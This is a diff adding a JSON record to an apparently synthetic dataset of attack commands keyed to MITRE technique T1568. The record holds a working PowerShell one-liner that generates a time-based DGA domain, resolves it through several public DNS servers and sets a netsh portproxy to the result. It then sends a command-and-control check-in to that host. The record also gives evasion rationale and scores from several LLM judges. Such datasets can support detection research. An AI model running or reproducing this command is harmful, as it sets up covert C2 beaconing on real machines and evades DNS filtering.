@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$domain='api'+(Get-Date -Format 'yyMMddHH')+'.cloud';$dns=@('8.8.8.8','1.1.1.1','9.9.9.9');$ip=$null;$usedServer=$null;foreach($s in $dns){try{$a=Resolve-DnsName -Name $domain -Type A -Server $s -ErrorAction Stop;$ip=($a|Get-Random).IPAddress;$usedServer=$s;break}catch{}};if($ip){netsh interface portproxy set v4tov4 listenaddress=127.0.0.1 listenport=8444 connectaddress=$ip connectport=443;Invoke-WebRequest -Uri 'http://127.0.0.1:8444/checkin' -UseBasicParsing -Headers @{DNS=$usedServer;Dom=$domain} -TimeoutSec 5}",
+  "explanation": "Cycles through multiple public DNS resolvers to obtain a current IP for a time-based DGA domain and establishes a portproxy to the dynamically resolved host.",
+  "rationale_steps": [
+    "Select an operational resolver to evade DNS filtering and ensure resolution.",
+    "Proxy local traffic to the resolved IP to maintain a resilient C2 path."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-74a9fca4",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid flag formats, and appropriate error handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1568 Dynamic Resolution technique by algorithmically generating a time-based domain name, attempting resolution through multiple public DNS servers, and establishing a connection to the dynamically resolved endpoint.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T05:50:06.464150Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/braces, valid cmdlets/parameters, proper separators, and a correctly constructed hashtable and pipeline.",
+        "semantic_score": 4,
+        "semantic_justification": "Accurately implements time-based DGA-style dynamic resolution using multiple DNS resolvers, but the portproxy check-in is likely to fail due to requiring admin privileges and sending HTTP traffic to a TLS (443) destination.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:50:36.971495Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced elements, valid cmdlets, and proper command separators.",
+        "semantic_score": 3,
+        "semantic_justification": "The command correctly implements dynamic resolution of a time-based DGA domain using multiple DNS resolvers, aligning well with T1568; however, the `netsh interface portproxy` command requires administrator privileges and will fail under the specified 'Privilege: None', preventing the establishment of the intended port proxy and subsequent C2 beaconing.",
+        "combined_score": 4.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T06:00:23.161645Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
